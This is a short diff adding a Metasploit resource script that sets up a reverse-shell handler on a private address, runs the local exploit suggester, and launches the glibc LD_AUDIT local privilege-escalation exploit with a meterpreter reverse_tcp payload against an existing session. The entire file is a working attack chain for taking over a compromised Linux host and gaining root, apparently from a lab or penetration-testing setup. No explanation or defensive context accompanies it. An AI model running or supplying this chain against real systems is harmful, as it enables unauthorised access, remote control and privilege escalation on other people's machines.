@@ -1,0 +1,12 @@
+use multi/handler
+set lhost 192.168.1.111
+set lport 4444
+run -z
+
+use post/multi/recon/local_exploit_suggester
+run
+use exploit/linux/local/glibc_ld_audit_dso_load_priv_esc
+set session 2
+set payload linux/x86/meterpreter/reverse_tcp
+set lport 5678
+run
